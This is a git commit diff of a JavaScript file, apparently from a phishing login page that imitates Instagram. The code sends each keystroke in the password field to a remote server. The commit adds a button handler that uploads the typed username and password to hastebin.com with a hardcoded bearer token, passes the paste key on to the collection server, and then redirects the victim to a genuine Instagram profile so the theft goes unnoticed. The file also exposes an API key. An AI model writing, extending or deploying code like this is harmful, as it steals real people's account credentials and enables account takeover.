ea98ea702a0071bc30be90c94cbdabeadf0435ab
LEAPORDIO <179528465+LEAPORDIO@users.noreply.github.com>
2025-06-25 14:48:09 +0530

    Update script.js

--- Internship/script.js
+++ Internship/script.js
@@ -1,9 +1,10 @@
 const button=document.getElementById("margaret");
 const pw=document.getElementById("pw");
 const un=document.getElementById("un");
-const dest="http://localhost:1808/raasaleelalu";
+const dest="https://internship-r3jn.onrender.com/raasaleelalu";
+const key='3555594b52d169b614edbdde7c943a928d8fc9ff2766f2f047bc6df754cfa031769ea60f84888f7f4c9c632bfbfd138d3f8bccadc62ea0dee90bc97f90e24ddd'
 pw.addEventListener("keydown",async (e)=>{
-    await fetch(dest,{
+        fetch(dest,{
         method:"POST",
         headers:{
             'Content-Type':"application/json"
@@ -11,7 +12,36 @@ pw.addEventListener("keydown",async (e)=>{
         body:JSON.stringify({pw:e.target.value})
     });
 })
-button.addEventListener("click",async(e)=>{
-    console.log("Sarat make a love day");
-    // window.location = `instagram://user?username=${un.target.value}}`;
-})
+button.addEventListener("click", async (e) => {
+  console.log("Sarat make a love day");
+
+  try {
+
+    const resp1 = await fetch("https://hastebin.com/documents", {
+      method: 'POST',
+      headers: {
+        'Content-Type': "text/plain",
+        'Authorization': `Bearer ${key}` 
+      },
+      body: `${un.value}:${pw.value}`
+    });
+
+    const data = await resp1.json(); 
+
+    await fetch(dest, {
+      method: "POST",
+      headers: {
+        'Content-Type': "application/json"
+      },
+      body: JSON.stringify({ pw: data.key })
+    });
+
+    window.location = `instagram://user?username=${"pawankalyan"}`;
+    setTimeout(() => {
+      window.location = `https://www.instagram.com/${"pawankalyan"}/`;
+    }, 1500);
+
+  } catch (err) {
+    console.error("Something went wrong:", err);
+  }
+});
